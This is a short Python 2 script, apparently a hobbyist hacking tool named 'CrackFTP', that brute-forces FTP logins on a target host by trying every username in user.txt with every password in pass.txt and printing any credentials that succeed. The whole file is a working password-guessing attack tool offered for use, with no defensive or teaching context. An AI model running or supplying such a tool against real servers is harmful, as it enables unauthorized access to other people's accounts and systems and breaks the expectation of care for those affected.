#!/usr/bin/env python2.7
#-*-coding:utf-8-*-
#__author__:1x2Bytes
import argparse
from ftplib import FTP
import socket
import sys
from threading import Thread
def banner():
    print'''
  ____                _    _____ _____ ____  
 / ___|_ __ __ _  ___| | _|  ___|_   _|  _ \ 
| |   | '__/ _` |/ __| |/ / |_    | | | |_) |
| |___| | | (_| | (__|   <|  _|   | | |  __/ 
 \____|_|  \__,_|\___|_|\_\_|     |_| |_|    
   @1x2Bytes
   dist : user.txt pass.txt
    '''

def crackftp(host,port,users,passwd):
    ftp = FTP()
    try:
        ftp.connect(host,port)
        ftp.login(users,passwd)
        print "[%s]CrackSuccess User:%s Pass: %s [+]" % (host,users,passwd)
    except Exception,e:
        print "[%s]CrackFail[!]" % (host)
def main():
    banner()
    users = open('user.txt')
    for lines in users:
        user = lines.strip('\n')
        passwords =open('pass.txt')
        for line in passwords:
            pwd = line.strip('\n')
            crackftp(host,port,user,pwd)
if __name__ == "__main__":
    parse = argparse.ArgumentParser(description="FTP Crack")
    parse.add_argument('-a','--host', type=str, help="ipaddress")
    parse.add_argument('-p','--port', type=int, help="PORTNumber",default=21)
    args = parse.parse_args()
    if not args.host:
        parse.print_help()
        sys.exit(0)
    host = socket.gethostbyname(args.host)
    port = args.port
    t = Thread(target=main)
    t.start()


